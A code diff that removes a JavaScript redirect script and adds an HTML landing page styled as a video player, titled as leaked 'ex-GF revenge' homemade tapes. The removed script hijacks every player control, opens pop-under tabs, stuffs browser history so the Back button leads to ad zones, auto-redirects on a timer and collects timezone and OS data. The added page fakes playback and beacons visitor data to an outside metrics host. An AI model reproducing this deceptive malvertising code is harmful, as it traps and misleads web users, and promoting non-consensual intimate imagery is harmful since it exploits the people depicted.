@@ -1,370 +1,333 @@
-/* common.js — vanisher-style micro handoff (FINAL v4)
-   Fixes:
-   - Added setTimeout(40ms) to replaceTo when history is pushed. 
-     This prevents the browser from choking on simultaneous history+redirect actions.
-   - Used stopImmediatePropagation to kill video play attempts on exit click.
-*/
-
-(() => {
-  "use strict";
-
-  // ---------------------------
-  // Helpers
-  // ---------------------------
-  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
-  const err  = (...a) => safe(() => console.error(...a));
-
-  // Обычный редирект
-  const replaceTo = (url) => {
-    try { window.location.replace(url); } catch { window.location.href = url; }
-  };
-
-  // Открытие вкладки (popup safe)
-  const openTab = (url) => {
-    try {
-      const w = window.open("about:blank", "_blank");
-      if (w) {
-        try { w.opener = null; } catch {}
-        try { w.location.replace(url); } catch { try { w.location.href = url; } catch {} }
-      }
-      return w || null;
-    } catch {
-      return null;
-    }
-  };
-
-  // ---------------------------
-  // URL + params
-  // ---------------------------
-  const curUrl = new URL(window.location.href);
-  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
-
-  const CLONE_PARAM = "__cl";
-  const isClone = getSP(CLONE_PARAM) === "1";
-
-  const IN = {
-    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
-    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
-    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
-    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
-    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
-    cid: getSP("cid"), geo: getSP("geo"),
-  };
-
-  const qsFromObj = (obj) => {
-    const qs = new URLSearchParams();
-    Object.entries(obj || {}).forEach(([k, v]) => {
-      if (v != null && String(v) !== "") qs.set(k, String(v));
-    });
-    return qs;
-  };
-
-  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
-  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;
-
-  const getOsVersion = async () => {
-    try {
-      const nav = navigator;
-      if (!nav.userAgentData?.getHighEntropyValues) return "";
-      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
-      return v?.platformVersion || "";
-    } catch {
-      return "";
-    }
-  };
-  let osVersionCached = "";
-  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));
-
-  const buildCmeta = () => {
-    try {
-      const html = document.documentElement;
-      const payload = {
-        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
-        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
-        templateHash: window.templateHash || "",
-      };
-      return btoa(JSON.stringify(payload));
-    } catch {
-      return "";
-    }
-  };
-
-  // ---------------------------
-  // Config
-  // ---------------------------
-  const normalizeConfig = (appCfg) => {
-    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
-    const cfg = { domain: appCfg.domain };
-    const ensure = (name) => (cfg[name] ||= {});
-
-    Object.entries(appCfg).forEach(([k, v]) => {
-      if (v == null || v === "" || k === "domain") return;
-      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
-      if (m) {
-        const [, name, tab, field] = m;
-        const ex = ensure(name);
-        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
-        ex[tab][field] = v;
-        return;
-      }
-      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
-      if (m) { ensure(m[1])[m[2]] = v; return; }
-      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
-      if (m) {
-        const [, name, field] = m;
-        const ex = ensure(name);
-        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
-        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
-        ex[tab][field] = v;
-      }
-    });
-    return cfg;
-  };
-
-  // ---------------------------
-  // URL Builders
-  // ---------------------------
-  const buildExitQSFast = ({ zoneId }) => {
-    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
-    const base = {
-      ymid: IN.var_1 || IN.var || "", var: IN.var_2 || IN.z || "", var_3: IN.var_3 || "",
-      b: IN.b || "", campaignid: IN.campaignid || "", click_id: IN.s || "", rhd: IN.rhd || "1",
-      os_version: osVersionCached || "", btz: getTimezoneName(), bto: String(getTimezoneOffset()),
-      cmeta: buildCmeta(), pz: IN.pz || "", tb: IN.tb || "", tb_reverse: IN.tb_reverse || "",
-      ae: IN.ae || "", ab2r,
-    };
-    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
-    return qsFromObj(base);
-  };
-
-  const generateAfuUrlFast = (zoneId, domain) => {
-    const host = String(domain || "").trim();
-    if (!host) return "";
-    const base = host.startsWith("http") ? host : `https://${host}`;
-    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
-    url.search = buildExitQSFast({ zoneId }).toString();
-    return url.toString();
-  };
-
-  // ---------------------------
-  // Back Logic
-  // ---------------------------
-  const pushBackStates = (url, count) => {
-    try {
-      const n = Math.max(0, parseInt(count, 10) || 0);
-      const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) {
-        window.history.pushState(null, "Please wait...", url);
-      }
-      window.history.pushState(null, document.title, originalUrl);
-    } catch (e) { err("Back pushState error:", e); }
-  };
-
-  const getDefaultBackHtmlUrl = () => {
-    const { origin, pathname } = window.location;
-    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
-    if (dir.endsWith("/")) dir = dir.slice(0, -1);
-    if (!dir) return `${origin}/back.html`;
-    return `${origin}${dir}/back.html`;
-  };
-
-  const initBackFast = (cfg) => {
-    const b = cfg?.back?.currentTab;
-    if (!b) return;
-    const count = cfg.back?.count ?? 10;
-    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
-    const page = new URL(pageUrl, window.location.href);
-    const qs = buildExitQSFast({ zoneId: b.zoneId });
-    if (b.url) qs.set("url", String(b.url));
-    else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
-    page.search = qs.toString();
-    pushBackStates(page.toString(), count);
-  };
-
-  // ---------------------------
-  // Exits (ГЛАВНЫЙ ФИКС ЗДЕСЬ)
-  // ---------------------------
-  const resolveUrlFast = (ex, cfg) => {
-    if (!ex) return "";
-    if (ex.url) return String(ex.url);
-    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
-    return "";
-  };
-
-  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
-    const ex = cfg?.[name]?.currentTab;
-    if (!ex) return;
-    const url = resolveUrlFast(ex, cfg);
-    if (!url) return;
-
-    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
+<!doctype html>
+<html lang="en" data-landing-name="player-v2">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0" />
+    <title>LEAKED Homemade Tapes 2025 | Real Ex-GF Revenge 🔥</title>
     
-    // --- ВАЖНО: Задержка 40мс перед редиректом ---
-    if (withBack) {
-        initBackFast(cfg);
-        // Даем браузеру переварить историю
-        setTimeout(() => replaceTo(url), 40); 
-    } else {
-        replaceTo(url);
-    }
-  };
+    <link rel="icon" type="image/svg+xml" href="./assets/favicon/favicon.svg">
 
-  const runExitDualTabsFast = (cfg, name, withBack = true) => {
-    const ex = cfg?.[name];
-    if (!ex) return;
-    const ct = ex.currentTab;
-    const nt = ex.newTab;
-    const ctUrl = resolveUrlFast(ct, cfg);
-    const ntUrl = resolveUrlFast(nt, cfg);
+    <script>
+        var APP_CONFIG = {
+            domain: "https://jup9.com", 
+            
+            // --- MAIN EXIT (Кнопка Play) ---
+            // Если заданы оба ID, сработает ДВОЙНОЙ ВЫХОД (NewTab + Redirect)
+            mainExit_currentTab_zoneId: 10576293, 
+            mainExit_newTab_zoneId: 10576292,
+            
+            // --- TABUNDER (Микро-клики: звук, таймлайн, HD) ---
+            // Если пусто, будет использоваться логика MainExit
+            tabUnderClick_zoneId: 10576300, 
 
-    safe(() => {
-      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
-      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
-    });
-
-    if (withBack) initBackFast(cfg);
-    if (ntUrl) openTab(ntUrl);
+            // --- REVERSE (Кнопка "Назад" в браузере) ---
+            reverse_zoneId: 10576291,
+            back_zoneId: 10576297,
+            back_count: 5, // Сколько записей в историю пихать
+            
+            // --- AUTOEXIT (Таймер) ---
+            autoexit_zoneId: 10576295,
+            autoexit_timeToRedirect: 200 // Секунды
+        };
+    </script>
     
-    if (ctUrl) {
-        // Тоже задержка для надежности
-        setTimeout(() => replaceTo(ctUrl), 40);
+    <script>
+    "use strict";
+    (() => {
+        const now = () => new Date().toISOString();
+        const p = new URL(location.href).searchParams;
+        const s = {
+            var_1: p.get("var_1") || "",
+            var_2: p.get("var_2") || "",
+            var_3: p.get("var_3") || "",
+            abtest: p.get("abtest") || ""
+        };
+
+        function send(data) {
+            const url = "https://wuytl.com/sync-metrics"; // Твой URL метрики
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(url, JSON.stringify(data));
+            }
+        }
+
+        window.syncMetric = ({ event, exitZoneId }) => {
+            const payload = [{
+                app: "landings-player",
+                event: event,
+                landing_url: location.href,
+                exit_zone_id: exitZoneId ? Number(exitZoneId) : undefined,
+                landing_load_date_time: now(),
+                sub_id: s.var_1
+            }];
+            // Простейшая проверка, включена ли аналитика (по дефолту да)
+            send(payload);
+        };
+        
+        window.syncMetric({ event: "start" });
+    })();
+    </script>
+
+    <style>
+        /* Базовый сброс */
+        html, body {
+            margin: 0; padding: 0; width: 100%; height: 100vh;
+            background: #000; overflow: hidden; font-family: sans-serif;
+        }
+
+        /* --- ЗОНЫ КЛИКА --- */
+        .xh-zone {
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; pointer-events: auto;
+            /* Для отладки зон раскомментируй строку ниже: */
+            /* border: 1px solid rgba(255,0,0,0.5); background: rgba(255,0,0,0.1); */
+        }
+        .xh-zone svg { fill: #fff; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
+
+        /* ВЕРХНИЕ КНОПКИ */
+        .xh-top-left { position: fixed; top: 15px; left: 15px; z-index: 100; width: 52px; height: 52px; }
+        .xh-top-right { 
+            position: fixed; top: 15px; right: 15px; z-index: 100; 
+            width: 48px; height: 48px; border-radius: 50%;
+            background: rgba(30,30,30,0.5); border: 1px solid rgba(255,255,255,0.1);
+        }
+        .xh-top-left svg, .xh-top-right svg { width: 28px; height: 28px; }
+
+        /* ВИДЕО КОНТЕЙНЕР */
+        .xh-main-screen {
+            position: absolute; inset: 0;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 10;
+        }
+        .xh-video-container {
+            width: 100%; max-width: 1220px; aspect-ratio: 16 / 9;
+            position: relative; background: #000;
+        }
+        .xh-video-element { width: 100%; height: 100%; object-fit: cover; }
+
+        /* PLAY BUTTON */
+        .xh-main-play-trigger {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%) scale(1);
+            width: 130px; height: 130px; z-index: 20;
+            opacity: 0; visibility: hidden; pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        
+        .xh-main-play-trigger.ready {
+            opacity: 1; visibility: visible; pointer-events: auto;
+            animation: pulsePlay 2.4s ease-in-out infinite;
+        }
+
+        @keyframes pulsePlay {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.08); }
+            100% { transform: translate(-50%, -50%) scale(1); }
+        }
+
+        .xh-main-play-trigger svg { width: 100%; height: 100%; filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.25)); }
+
+        /* НИЖНЯЯ ПАНЕЛЬ */
+        .xh-bottom-interface {
+            position: fixed; left: 0; bottom: 0; width: 100%; z-index: 100;
+            padding: 0 10px 10px; box-sizing: border-box;
+            background: linear-gradient(0deg, #000 0%, rgba(0,0,0,0.8) 60%, transparent 100%);
+            pointer-events: none;
+        }
+
+        .xh-timeline-trigger { width: 100%; padding: 15px 0 10px; pointer-events: auto; }
+        .xh-line-bg { width: 100%; height: 4px; background: rgba(255,255,255,0.25); position: relative; }
+        .xh-line-fill { position: absolute; left: 0; top: 0; height: 100%; width: 5%; background: #f00; }
+
+        .xh-flex-row { display: flex; justify-content: space-between; align-items: center; }
+        .xh-side { display: flex; align-items: center; }
+
+        .xh-icon-zone { width: 52px; height: 52px; pointer-events: auto; }
+        .xh-icon-zone svg { width: 32px; height: 32px; }
+
+        .xh-relative { position: relative; }
+        .xh-hd-tag {
+            position: absolute; top: 11px; right: 5px; background: #f00; color: #fff;
+            font-size: 8px; font-weight: 900; padding: 1px 2px; border-radius: 2px;
+        }
+        .xh-time-display { color: #fff; font-size: 16px; font-weight: 500; padding: 0 5px; }
+    </style>
+</head>
+
+<body class="body">
+
+    <div class="xh-zone xh-top-left" data-target="back_button">
+        <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+    </div>
+
+    <div class="xh-zone xh-top-right" data-target="pip_top">
+        <svg viewBox="0 0 24 24"><path d="M19 7h-8v6h8V7zm2-4H3c-1.1 0-2 .9-2 2v14c0 1.1.9 1.98 2 1.98h18c1.1 0 2-.88 2-1.98V5c0-1.1-.9-2-2-2zm0 16.01H3V4.98h18v14.03z"/></svg>
+    </div>
+
+    <div class="xh-main-screen">
+        <div class="xh-video-container">
+            <video class="xh-video-element" playsinline muted preload="auto">
+                <source src="./vid.mp4" type="video/mp4">
+            </video>
+
+            <div class="xh-zone xh-main-play-trigger" data-target="main_play">
+                <svg viewBox="0 0 140 140">
+                    <circle cx="70" cy="70" r="66" stroke="white" stroke-width="6" fill="rgba(0,0,0,0.45)"/>
+                    <polygon points="55,40 105,70 55,100" fill="white"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="xh-bottom-interface">
+        <div class="xh-zone xh-timeline-trigger" data-target="timeline">
+            <div class="xh-line-bg">
+                <div class="xh-line-fill"></div>
+            </div>
+        </div>
+
+        <div class="xh-flex-row">
+            <div class="xh-side">
+                <div class="xh-zone xh-icon-zone" data-target="play_pause">
+                    <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+                </div>
+                <div class="xh-zone xh-icon-zone" data-target="mute_unmute">
+                    <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
+                </div>
+                <div class="xh-time-display">0:03 / 8:32</div>
+            </div>
+
+            <div class="xh-side">
+                <div class="xh-zone xh-icon-zone" data-target="pip_bottom">
+                    <svg viewBox="0 0 24 24"><path d="M19 11h-8v6h8v-6zm4-7V16c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h18c1.1 0 2 .9 2 2zm-2 0H3v12h18V4z"/></svg>
+                </div>
+                <div class="xh-zone xh-icon-zone xh-relative" data-target="settings">
+                    <span class="xh-hd-tag">HD</span>
+                    <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/></svg>
+                </div>
+                <div class="xh-zone xh-icon-zone" data-target="fullscreen">
+                    <svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zM14 5v2h3v3h2V5h-5z"/></svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+"use strict";
+document.addEventListener("DOMContentLoaded", () => {
+  const playBtn = document.querySelector(".xh-main-play-trigger");
+  const video = document.querySelector(".xh-video-element");
+  const progress = document.querySelector(".xh-line-fill");
+  const timeDisplay = document.querySelector(".xh-time-display");
+
+  if (!video || !playBtn) return;
+
+  const STOP_AT = 3.0;
+  const TOTAL_SEC = 8 * 60 + 32;
+
+  const sp = new URL(location.href).searchParams;
+  const IS_CLONE = sp.get("__cl") === "1";
+  const SKIP_PREVIEW = IS_CLONE || (sp.get("__skipPreview") === "1");
+
+  // poster: можно переопределить ?__poster=...
+  const POSTER_DEFAULT = "./assets/poster-3s.webp";
+  const POSTER = sp.get("__poster") || video.getAttribute("poster") || POSTER_DEFAULT;
+
+  let stopped = false;
+  let hasStarted = false;
+  let rafId = 0;
+
+  const fmt = (s) => {
+    const mm = Math.floor(s / 60);
+    const ss = Math.floor(s % 60).toString().padStart(2, "0");
+    return `${mm}:${ss}`;
+  };
+
+  const setProgress = (t) => {
+    const tt = Math.max(0, t);
+    const realP = tt / TOTAL_SEC;
+    const p = Math.max(0, Math.min(1, realP));
+    if (progress) progress.style.width = (p * 100) + "%";
+    if (timeDisplay) timeDisplay.textContent = `${fmt(tt)} / 8:32`;
+  };
+
+  // --- CLONE: не проигрываем превью, показываем постер + ready ---
+  const setCloneReadyPoster = () => {
+    stopped = true;
+    hasStarted = true;
+
+    try { cancelAnimationFrame(rafId); } catch {}
+
+    try {
+      video.pause();
+
+      // Важно: выставить постер
+      video.setAttribute("poster", POSTER);
+
+      // Отключаем лишние попытки загрузки
+      video.preload = "none";
+      video.autoplay = false;
+      video.muted = true;
+      video.playsInline = true;
+
+      // Оборвать загрузку vid.mp4 на клоне (для “бесшовности”)
+      const sources = video.querySelectorAll("source");
+      sources.forEach(s => s.remove());
+      video.removeAttribute("src");
+      video.load();
+    } catch {}
+
+    setProgress(STOP_AT);
+    playBtn.classList.add("ready");
+  };
+
+  if (SKIP_PREVIEW) {
+    setCloneReadyPoster();
+    return;
+  }
+
+  // --- v1 normal preview behaviour ---
+  const stopAtPreview = () => {
+    if (stopped) return;
+    stopped = true;
+    try { video.pause(); video.currentTime = STOP_AT; } catch {}
+    try { cancelAnimationFrame(rafId); } catch {}
+    setProgress(STOP_AT);
+    playBtn.classList.add("ready");
+  };
+
+  const tick = () => {
+    if (stopped) return;
+    setProgress(video.currentTime || 0);
+    if ((video.currentTime || 0) >= STOP_AT) { stopAtPreview(); return; }
+    rafId = requestAnimationFrame(tick);
+  };
+
+  const startAction = async () => {
+    if (hasStarted) return;
+    hasStarted = true;
+    try {
+      await video.play();
+      rafId = requestAnimationFrame(tick);
+      setTimeout(() => { if (!stopped) stopAtPreview(); }, (STOP_AT + 0.5) * 1000);
+    } catch {
+      stopAtPreview();
     }
   };
 
-  const run = (cfg, name) => {
-    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
-      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true) : runExitCurrentTabFast(cfg, "mainExit", true);
-    }
-    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
-    return runExitCurrentTabFast(cfg, name, true);
-  };
+  const checkStart = () => { if (!document.hidden && !hasStarted) startAction(); };
+  document.addEventListener("visibilitychange", checkStart);
+  document.addEventListener("click", checkStart, { once: true });
+  checkStart();
+});
+</script>
 
-  // ---------------------------
-  // Reverse & Autoexit
-  // ---------------------------
-  const initReverse = (cfg) => {
-    if (!cfg?.reverse?.currentTab) return;
-    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
-    window.addEventListener("popstate", () => {
-      runExitCurrentTabFast(cfg, "reverse", false);
-    });
-  };
 
-  const initAutoexit = (cfg) => {
-    if (!cfg?.autoexit?.currentTab) return;
-    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
-    let armed = false;
-    const trigger = () => {
-      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
-    };
-    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
-    const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
-    document.addEventListener("visibilitychange", trigger);
-    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
-  };
 
-  const isPlayerReady = () => {
-    const btn = document.querySelector(".xh-main-play-trigger");
-    return !!(btn && btn.classList.contains("ready"));
-  };
+   <script defer src="./assets/scripts/common.js"></script>
 
-  // ---------------------------
-  // Micro Handoff
-  // ---------------------------
-  const MICRO_DONE_KEY = "__micro_done";
-  const buildCloneUrl = () => {
-    const u = new URL(window.location.href);
-    u.searchParams.set(CLONE_PARAM, "1");
-    u.searchParams.set("__skipPreview", "1");
-    return u.toString();
-  };
+</body>
 
-  const runMicroHandoff = (cfg) => {
-    if (isClone) return;
-    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") return run(cfg, "mainExit");
-    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
+</html>
 
-    const cloneUrl = buildCloneUrl();
-    safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
-    openTab(cloneUrl);
 
-    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
-    const monetUrl = resolveUrlFast(ex, cfg);
-    if (monetUrl) {
-      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
-      initBackFast(cfg);
-      setTimeout(() => replaceTo(monetUrl), 40); // Timeout здесь тоже
-    } else {
-      run(cfg, "mainExit");
-    }
-  };
 
-  // ---------------------------
-  // Click Map (СБОР СОБЫТИЙ И БЛОКИРОВКА ВИДЕО)
-  // ---------------------------
-  const initClickMap = (cfg) => {
-    const fired = { mainExit: false, back: false };
-    const microTargets = new Set(["timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"]);
-
-    // useCapture = true — мы ловим событие ДО того, как оно дойдет до видео
-    document.addEventListener("click", (e) => {
-      const zone = e.target?.closest?.("[data-target]");
-      const t = zone?.getAttribute("data-target") || "";
-
-      // Back Button
-      if (t === "back_button") {
-        if (fired.back) return;
-        fired.back = true;
-        // Убиваем остальные обработчики
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        runExitCurrentTabFast(cfg, "back", true);
-        return;
-      }
-
-      // Clone -> MainExit
-      if (isClone) {
-        if (fired.mainExit) return;
-        fired.mainExit = true;
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        run(cfg, "mainExit");
-        return;
-      }
-
-      // Micro
-      if (microTargets.has(t)) {
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        runMicroHandoff(cfg);
-        return;
-      }
-
-      // Main Exit (Любой другой клик)
-      if (fired.mainExit) return;
-      fired.mainExit = true;
-      
-      // БЛОКИРУЕМ ЗАПУСК ВИДЕО
-      e.preventDefault(); 
-      e.stopPropagation();
-      e.stopImmediatePropagation(); 
-
-      run(cfg, "mainExit");
-    }, true); 
-  };
-
-  const boot = () => {
-    if (typeof window.APP_CONFIG === "undefined") {
-      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
-      return;
-    }
-    const cfg = normalizeConfig(window.APP_CONFIG);
-    if (!cfg) return;
-
-    window.LANDING_EXITS = {
-      cfg, run: (name) => run(cfg, name), initBack: () => initBackFast(cfg),
-      microHandoff: () => runMicroHandoff(cfg), isPlayerReady,
-    };
-    initClickMap(cfg); initAutoexit(cfg); initReverse(cfg);
-  };
-
-  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
-  else boot();
-})();
